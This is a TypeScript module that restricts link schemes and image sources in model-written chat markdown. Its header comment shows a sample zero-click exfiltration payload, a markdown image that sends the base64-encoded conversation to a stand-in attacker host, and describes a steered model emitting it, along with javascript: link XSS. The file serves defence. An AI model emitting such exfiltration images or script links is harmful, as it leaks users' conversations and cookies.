/**
 * Origin and scheme policy for model-authored markdown.
 *
 * Everything the chat renders is written by a language model, and a model can be
 * steered by whatever is in its context. Two concrete attacks this closes:
 *
 * 1. Zero-click exfiltration. A model emits
 *      ![](https://attacker.tld/p?d=<base64 of the conversation>)
 *    and the browser fires that GET the moment it renders — no click needed. The
 *    conversation leaves the machine.
 *
 * 2. Stored XSS via link scheme. A `javascript:` href on a same-origin dashboard
 *    page carries cookies for every management API.
 *
 * Streamdown has no image-origin allowlist prop (it exposes `linkSafety` and
 * `allowedTags` only), so image policy is enforced by overriding the `img`
 * component. These helpers are the single place that policy lives.
 *
 * @module lib/chat/markdown-safety
 */

/** Schemes a link may use. Everything else — javascript:, vbscript:, file: — is dropped. */
const SAFE_LINK_SCHEMES = new Set(["http:", "https:", "mailto:"]);

/**
 * Image sources the renderer will actually load.
 *
 * `data:` is allowed because the user's own attachments are rehydrated as data
 * URLs and carry no network request. Remote origins are NOT allowed: a remote
 * image is an outbound request the user never consented to.
 */
const SAFE_IMAGE_SCHEMES = new Set(["data:", "blob:"]);

/** Same-origin paths the app itself serves (e.g. rehydrated attachments). */
const SAFE_IMAGE_PATH_PREFIXES = ["/api/attachments/"];

export function isSafeLinkHref(href: string | undefined | null): boolean {
  if (!href) return false;

  const trimmed = href.trim();
  // An empty string would resolve to the base URL below and be waved through.
  if (!trimmed) return false;

  // A protocol-relative URL inherits the page's scheme and reaches a remote host.
  if (trimmed.startsWith("//")) return false;

  // Relative links and anchors never carry a scheme and are safe by construction.
  if (trimmed.startsWith("/") || trimmed.startsWith("#")) return true;

  try {
    // A base is required so a bare path does not throw; absolute URLs ignore it.
    const url = new URL(trimmed, "https://localhost");
    return SAFE_LINK_SCHEMES.has(url.protocol);
  } catch {
    return false;
  }
}

/**
 * True only for images the app itself produced.
 *
 * Deliberately strict. A model has no legitimate reason to reference a remote
 * image, and allowing one is the exfiltration channel.
 */
export function isSafeImageSrc(src: string | undefined | null): boolean {
  if (!src) return false;

  const trimmed = src.trim();
  // Empty resolves to the base URL below; protocol-relative reaches a remote host.
  if (!trimmed || trimmed.startsWith("//")) return false;

  if (SAFE_IMAGE_PATH_PREFIXES.some((prefix) => trimmed.startsWith(prefix))) return true;

  try {
    const url = new URL(trimmed, "https://localhost");
    return SAFE_IMAGE_SCHEMES.has(url.protocol);
  } catch {
    return false;
  }
}
